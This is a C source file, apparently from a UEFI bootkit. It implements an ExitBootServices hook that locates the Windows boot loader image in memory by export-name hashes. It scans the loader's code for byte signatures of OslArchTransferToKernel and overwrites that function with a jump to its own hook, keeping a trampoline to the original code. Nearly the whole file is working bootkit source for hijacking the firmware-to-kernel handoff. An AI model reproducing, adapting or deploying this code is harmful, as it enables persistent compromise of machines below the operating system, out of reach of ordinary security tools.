#include "Common.h"

D_SEC( B ) EFI_STATUS EFIAPI ExitBootServicesHook( EFI_HANDLE ImageHandle, UINTN Key )
{
	SIZE_T			Osl = 0;

	PVOID			Osp = NULL;
	PEFTBL			Eft = NULL;
	PUINT8			Ptr = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PIMAGE_DATA_DIRECTORY	Dir = NULL;
	PIMAGE_EXPORT_DIRECTORY	Exp = NULL;

	/* Get pointer to EFI Table */
	Eft = C_PTR( G_PTR( EfTbl ) );

	/* Find the return address and align it to the bottom of the page */
	Dos = C_PTR( __builtin_extract_return_addr( __builtin_return_address( 0 ) ) );
	Dos = C_PTR( U_PTR( U_PTR( Dos ) &~ ( 0x1000 - 1 ) ) );

	do 
	{
		/* Is this the MZ magic? */
		if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {
			if ( Dos->e_lfanew < 0x100 ) {
				/* Get NT header */
				Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );

				if ( Nth->Signature == IMAGE_NT_SIGNATURE ) {
					/* Abort */
					break;
				};
			};
		};
		/* Decrement */
		Dos = C_PTR( U_PTR( Dos ) - 0x1000 );
	} while ( TRUE );

	/* Get pointer to the export table data directory */
	Dir =  & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	if ( Dir->VirtualAddress ) {
		/* Get pointer to the export address table */
		Exp = C_PTR( U_PTR( Dos ) + Dir->VirtualAddress );

		/* Is our target boot services driver? */
		if ( HashString( C_PTR( U_PTR( Dos ) + Exp->Name ), 0 ) == 0x8deb5a3a ||
		     HashString( C_PTR( U_PTR( Dos ) + Exp->Name ), 0 ) == 0x64255bfd ||
		     HashString( C_PTR( U_PTR( Dos ) + Exp->Name ), 0 ) == 0x64259d80 ) 
		{
			/* Get PE Section header */
			Sec = IMAGE_FIRST_SECTION( Nth );

			/* Enumerate all PE Sections */
			for ( INT Idx = 0 ; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
				/* Is this .text section? */
				if ( HashString( & Sec[ Idx ].Name, 0 ) == 0x0b6ea858 ) {
					for ( INT Jdx = 0 ; Jdx < Sec[ Idx ].SizeOfRawData ; ++Jdx ) {
						/* Get a pointer to the current instruction */
						Ptr = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress + Jdx );

						/* OslArchTransferToKernel Signature x1 */
						if ( Ptr[ 0x00 ] == 0x33 && Ptr[ 0x01 ] == 0xf6 &&
						     Ptr[ 0x15 ] == 0x48 && Ptr[ 0x16 ] == 0x8d && Ptr[ 0x17 ] == 0x05 &&
						     Ptr[ 0x1c ] == 0x48 && Ptr[ 0x1d ] == 0x8d && Ptr[ 0x1e ] == 0x0d &&
						     Ptr[ 0x23 ] == 0x0f && Ptr[ 0x24 ] == 0x01 && Ptr[ 0x25 ] == 0x10 &&
						     Ptr[ 0x26 ] == 0x0f && Ptr[ 0x27 ] == 0x01 && Ptr[ 0x28 ] == 0x19 )
						{
							Osp = C_PTR( Ptr );
							Osl = 14;
							break;
						};

						/* OslArchTransferToKernel Signature x2 */
						if ( Ptr[ 0x00 ] == 0x33 && Ptr[ 0x01 ] == 0xf6 &&
						     Ptr[ 0x17 ] == 0x48 && Ptr[ 0x18 ] == 0x8d && Ptr[ 0x19 ] == 0x05 &&
						     Ptr[ 0x1e ] == 0x48 && Ptr[ 0x1f ] == 0x8d && Ptr[ 0x20 ] == 0x0d &&
						     Ptr[ 0x25 ] == 0x0f && Ptr[ 0x26 ] == 0x01 && Ptr[ 0x27 ] == 0x10 &&
						     Ptr[ 0x28 ] == 0x0f && Ptr[ 0x29 ] == 0x01 && Ptr[ 0x2a ] == 0x19 )
						{
							Osp = C_PTR( Ptr );
							Osl = 16;
							break;
						};

						/* Note: Add x86 signatures here if you want x86 support */
					};
					/* .text is found */
					break;
				};
			};
			/* Has the pointer to the function? */
			if ( Osp != NULL ) {
				/* Copy over the callgate. */
				__builtin_memcpy( C_PTR( G_PTR( EfClg ) ), Osp, Osl );

				/* Insert hook into OslArchTransferToKernel */
				*( PUINT16 )( C_PTR( U_PTR( Osp ) + 0x00 ) ) = ( UINT16 )( 0x25FF );
				*( PUINT32 )( C_PTR( U_PTR( Osp ) + 0x02 ) ) = ( UINT32 )( 0 );
				*( PUINT64 )( C_PTR( U_PTR( Osp ) + 0x06 ) ) = ( UINT64 )( C_PTR( G_PTR( OslArchTransferToKernelHook ) ) );

				/* Insert jump callgate */
				*( PUINT16 )( C_PTR( U_PTR( G_PTR( EfClg ) ) + Osl + 0x00 ) ) = ( UINT16 )( 0x25FF );
				*( PUINT32 )( C_PTR( U_PTR( G_PTR( EfClg ) ) + Osl + 0x02 ) ) = ( UINT32 )( 0 );
				*( PUINT64 )( C_PTR( U_PTR( G_PTR( EfClg ) ) + Osl + 0x06 ) ) = ( UINT64 )( C_PTR( U_PTR( Osp ) + Osl ) );

				/* Store the callgate address */
				Eft->OslArchTransferToKernelGate = C_PTR( G_PTR( EfClg ) );
			};
		};
	};
	/* Execute original function */
	return Eft->ExitBootServices( ImageHandle, Key );
};
